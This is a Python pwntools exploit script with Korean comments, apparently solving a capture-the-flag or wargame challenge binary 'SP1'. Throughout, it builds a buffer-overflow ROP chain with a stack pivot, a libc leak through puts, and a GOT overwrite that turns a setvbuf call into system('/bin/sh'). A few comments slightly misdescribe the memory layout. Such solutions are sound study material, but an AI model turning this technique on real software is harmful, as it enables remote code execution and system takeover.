from pwn import *

p = process('./SP1')

# 사용할 가젯 주소 필요 -> rop체인 구하기 -> ROPgadget에서 구하기 가능
pop_rdi_ret = 0x401293 # 첫 번째 인자 전달용
pop_rsi_r15_ret = 0x401291 # 두 번째 인자 전달용
pop_rdx_ret = 0x40119e # 세 번째 인자 전달용
leave_ret = 0x401224 # 스택 피벗용 가젯

# 필요한 함수 주소 -> pwndbg에서 구할 수 있음
puts_plt = 0x401070
puts_got = 0x404018 # 실제 libc 주소 찾기용
read_plt =  0x401090 # 메모리 덮어쓰기용
setvbuf_plt = 0x4010a0
setvbuf_got = 0x404030 # 덮어쓸 대상

# name 변수 주소 -> disassemble에서 확인 가능
# fake stac 공간으로 사용 : bss 영역
name = 0x404080

# payload 작성
# ROP 체인 : .bss 영역에 작성될 fake stack
payload = b'A' * 0x700
payload += p64(0) # fake rbp -> leave_ret 실행시 rsp가 될 주소
payload += p64(pop_rdi_ret)
payload += p64(puts_got) # puts주소 유출
payload += p64(puts_plt)

# read(0, setvbuf@got, 16) setvbuf@got + 8에 system주소, 뒤에 "/bin/sh"
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(setvbuf_got)
payload += p64(0)
payload += p64(pop_rdx_ret)
payload += p64(16)
payload += p64(read_plt)

# setvbuf@plt(setvbuf@got + 8) -> 실제로는 system("/bin/sh") 호출
payload += p64(pop_rdi_ret)
payload += p64(setvbuf_got+8)
payload += p64(setvbuf_plt)

# 첫 번째 페이로드 전송
p.sendafter(b'name?: ', payload)

# payload 작성
# stack pivot 유도 (leave; ret 사용)
payload = b'A' * 0x20
payload += p64(name+0x700) # fake fbp
payload += p64(leave_ret) # stack pivot

# 두 번재 페이로드 전송
p.sendafter(b'comment?: ',payload)

p.recvline()
puts_libc = u64(p.recvn(6)+b'\x00\x00')
libc_base = puts_libc - 0x84420
system_libc = libc_base + 0x52290

# 유출 주소 출력
print('puts_libc:', hex(puts_libc))
print('libc_base:', hex(libc_base))
print('system_libc:', hex(system_libc))

# read로 보낼 진짜 페이로드
payload = p64(system_libc) # setvbuf@got + 8 (system주소)
payload += b'/bin/sh\x00'  # setvbuf@got + 16 ('/bin/sh' 문자열)

# 세 번째 페이로드 전송
p.send(payload)

# 쉘 코드 실행
p.interactive() 